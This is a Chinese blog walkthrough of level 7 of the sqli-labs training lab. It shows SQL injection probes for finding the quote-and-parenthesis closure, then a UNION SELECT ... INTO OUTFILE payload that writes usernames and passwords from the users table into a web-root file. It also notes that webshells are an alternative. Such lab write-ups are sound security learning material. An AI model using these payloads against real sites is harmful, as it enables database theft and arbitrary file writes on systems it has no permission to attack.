<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>sqli-labs基础篇【第七关】详细解析 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="sqli-labs基础篇【第七关】详细解析" />
<meta property="og:description" content="Ⅰ 验证是否注入点 从下面的注入测试来看，只有两种输出结果
如果sql执行了，就会输出“You are in… Use outfile…”，反之输入“You have an error in your SQL syntax”
?id=1 --&#43; --You are in.... Use outfile...... ?id=1&#39; --&#43; -- You have an error in your SQL syntax ?id=-1&#39; --&#43; --You have an error in your SQL syntax ?id=1\ --&#43; --You are in.... Use outfile...... 查看是否存在双引号注入
正常输出，说明有执行，存在双引号注入
?id=1&#34; --&#43; -- You are in.... Use outfile...... 查看是否存在闭合特殊符号
?id=1&#39; and 1=1--&#43; -- 报错，sql没有执行，存在闭合 ?id=1&#39;) and 1=1--&#43; --报错，还有一个闭合 ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/0b66173819a5830859d3cc7aaed16e3c/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-11T09:43:03+08:00" />
<meta property="article:modified_time" content="2023-01-11T09:43:03+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">sqli-labs基础篇【第七关】详细解析</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="__0"></a>Ⅰ 验证是否注入点</h3> 
<p>  从下面的注入测试来看，只有两种输出结果<br>   如果sql执行了，就会输出“You are in… Use outfile…”，反之输入“You have an error in your SQL syntax”</p> 
<pre><code class="prism language-plsql">?id=1 --+   --You are in.... Use outfile......
?id=1' --+  -- You have an error in your SQL syntax
?id=-1' --+ --You have an error in your SQL syntax
?id=1\ --+  --You are in.... Use outfile......

</code></pre> 
<p>查看是否存在双引号注入<br> 正常输出，说明有执行，存在双引号注入</p> 
<pre><code class="prism language-plsql">?id=1"  --+ -- You are in.... Use outfile......
</code></pre> 
<p>查看是否存在闭合特殊符号</p> 
<pre><code class="prism language-plsql">?id=1' and 1=1--+  -- 报错，sql没有执行，存在闭合
?id=1') and 1=1--+  --报错，还有一个闭合
?id=1')) and 1=1--+  -- 正常输出

</code></pre> 
<p>推测注入点：双引号+两个闭合<br> <img src="https://images2.imgbox.com/01/37/6Fd4Tv5Y_o.png" alt="image.png"><br> <img src="https://images2.imgbox.com/ac/ac/ATS2nkVH_o.png" alt="image.png"><br> 看一下源码，确定是是双引号+单引号注入</p> 
<pre><code class="prism language-plsql">$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
</code></pre> 
<p>构建个playload</p> 
<pre><code class="prism language-plsql">?id=1')) --+ 
</code></pre> 
<h3><a id="__35"></a>Ⅱ 爆出列数和回显位</h3> 
<p>常规注入，显示出列数和回显位</p> 
<h3><a id="__38"></a>Ⅲ 注入开始</h3> 
<p>  根据提示，“You are in… Use outfile…”，可以使用文件上传漏洞，进行注入<br> 注：也有用 一句话木马进行注入 ，在这里直接利用outfile，上传文件</p> 
<h4><a id="1_41"></a>（1）环境配置</h4> 
<p>  首先在进行文件上传漏洞注入前，先确定下自己的靶场环境，之前是使用线上的sqli-labs靶场，但是到了第七关就不好用了，因为我不知道线上靶场的web目录放在哪里，不好搞。<br>   所以用<strong>phpStudy+sqli-labs+linux</strong>，搭建了一个靶场，进行练习<br> 正常情况下，phpStudy配置好，就可以运行sqli-labs<br> <img src="https://images2.imgbox.com/e4/2f/IuRCrJr9_o.png" alt="image.png"></p> 
<p>  但mysql注入的文件上传，需要有权限，需要在phpStudy上，对mysql进行设置，添加一个“secure-file-priv = ”，添加好了，就重启mysql<br> <img src="https://images2.imgbox.com/f8/fe/U8ZDn8hY_o.png" alt="image.png"></p> 
<h4><a id="2_49"></a>（2）注入格式</h4> 
<p>根据前面得出的可注入点，进行编写注入playload</p> 
<pre><code class="prism language-plsql">index.php?id=-1')) union select 1,2,(XXXsql语句) 
									 into outfile  '/www/admin/localhost_80/wwwroot/sqli-labs/Less-7/4.txt' --+

</code></pre> 
<ul><li>XXXSQL语句：用之前的常规sql注入语句替换即可</li><li>outfile：后面接的是，注入页面的文件路径，以及输入的文件名</li></ul> 
<p>举个例子：爆数据</p> 
<pre><code class="prism language-plsql">index.php?id=-1')) 
				union select 
				database(),
				user(),
				(select concat_ws('~',id,username,password) 
				from security.users limit 0,1) 
				into outfile  '/www/admin/localhost_80/wwwroot/sqli-labs/Less-7/4.txt' --+
</code></pre> 
<p><img src="https://images2.imgbox.com/cc/03/cmrXSnxI_o.png" alt="image.png" title="生成后的文件"><br> <img src="https://images2.imgbox.com/1a/e5/D5idwW8z_o.png" alt="image.png" title="结果出来"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f51fa2b880e28afb1e72264867176e71/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Linux 创建文件系统</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0d163facac6493b65013a325b01a3b91/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">向量到欧拉角</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>